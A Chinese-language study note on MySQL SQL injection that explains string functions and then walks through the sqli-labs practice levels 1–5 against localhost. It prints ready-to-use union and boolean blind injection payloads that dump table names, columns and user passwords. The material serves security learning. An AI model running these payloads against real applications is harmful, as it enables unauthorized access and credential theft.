[TOC]

# 前置知识点

## 系统函数

-   version()--Mysql版本
-   user()--数据库用户名
-   database()--数据库名
-   @@datadir--数据库路径
-   @@version_compile_os--操作系统版本



## 字符串连接函数

concat(),group_concat(),concat_ws()

### 1. concat()

​    首先联合注入（union）要求前后选择的列数要相同，假设只有id一个列，但我们想要id和user时，就可以用concat()。

比如：

​	`concat(id,',',user)`，那么返回为：	`1,admin`

### 2. concat_ws()

CONCAT With Separator，是concat的一种特殊形式、

第一个参数是其他参数的分隔符，可以是一个字符串，也可以是其他参数，如果分割符为null那么结果为null，函数会忽略任何分隔符参数后的 NULL 值。

但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）。

**用法：**

​	`concat_ws(separator,str1,str2,...)`

### 3. group_concat()



## 字符串截取常用函数

三大法宝：mid(),substr(),left()

### 1. mid()

mid(column_name,start,length)

| **参数**    | **描述**                                                    |
| ----------- | ----------------------------------------------------------- |
| column_name | 必需。要提取字符的字段。                                    |
| start       | 必需。规定开始位置（起始值是 1）。                          |
| length      | 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。 |

eg：str=123456，，，，mid(str,1,1) 结果为2

sql示例：

1.  mid(databases(),1,1)>'a'，查看数据库名第一位，mid(databases(),2,1)查看数据库名第二位，依次查看个位字符。
2.  MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。

### 2. substr()

​	substr()与substring()函数使用的功能是一样的。

​	substr(string,start,length) 

## 3. left()

left ( string, n )    string为要截取的字符串，n为长度。

### 4.ord()

返回第一个字符的ASCII码

## sql盲注之正则表达式

假设数据库名为bind_sql

1.  判断第一个表名的第一个字符是否是a-z中的字符

    >   ?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-z]' LIMIT 0,1)--+

2.  判断第一个表名的第一个字符是否是a-n中的字符

    >   ?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^[a-n]' LIMIT 0,1)--+

3.  确定该字符为n

    >   ?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" AND table_name REGEXP '^n' LIMIT 0,1) --+

4.  表达式更换如下：

    ^n[a-z] ---> '^ne[a-z]' -> '^new[a-z]' -> '^news[a-z]' -> FALSE

    这时确定了表名为news

------

# sqllab靶场

## Less1~Less4

```
猜数据库 
select schema_name from information_schema.schemata 
猜某库的数据表 
select table_name from information_schema.tables where table_schema=’xxxxx’ 
猜某表的所有列 
Select column_name from information_schema.columns where table_name=’xxxxx’
```



### 爆数据库

`union select 1,group_concat(schema_name),3 from information_schema.schemata--+`

### 爆数据库security的表

`union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+`

### 爆users表的列

`union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+`

### 爆数据

`union select id,group_concat(username),group_concat(password) from security.users--+`

或

`union select id,group_concat(username),group_concat(password) from security.users where id=2--+`

sqllab的less1-4都是这样

## Less5  盲注

这关是盲注，只有显示或不显示，比如：

`http://localhost/sql/Less-5/?id=1' and left(version(),1)=5--+`

`http://localhost/sql/Less-5/?id=1' and length(database())=8--+`

以上判断版本的第一位和数据库长度都是正确的。

### 1）使用left(database(),1)尝试

**猜数据库第一位：**

可以用二分来一直找：找到是s

`http://localhost/sql/Less-5/?id=1' and left(database(),1) ='s'--+`

**猜数据库第二位：**

判断第二位是否大于a：

`http://localhost/sql/Less-5/?id=1' and left(database(),2) >'sa'--+`

同样，可以找到后面的。。。

### 2）使用substr() ascii()尝试

`http://localhost/sql/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+`

同样可以使用二分，这里是email，e为101。

第一个表的第二位字符：substr(\*\*\*\*,2,1)即可

`http://localhost/sql/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=108--+`

第一个表列完了，那第二个表呢？limit 1,1

### 3）使用regexp获取 2）中users表中的列

>   http://localhost/sql/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+

上面的语句选择users表中的列是否有us**的列

>   http://localhost/sql/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+

有username，换成password也存在

### 4）利用ord() 和mid()获取users表中的内容

>   http://localhost/sql/Less-5/?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+

获取 users 表中的内容。获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较， 即为 D。而我们从表中得知第一行的数据为 Dumb。所以接下来只需要重复造轮子即可

布尔盲注如上都完了，接下来就是报错注入和延时注入：

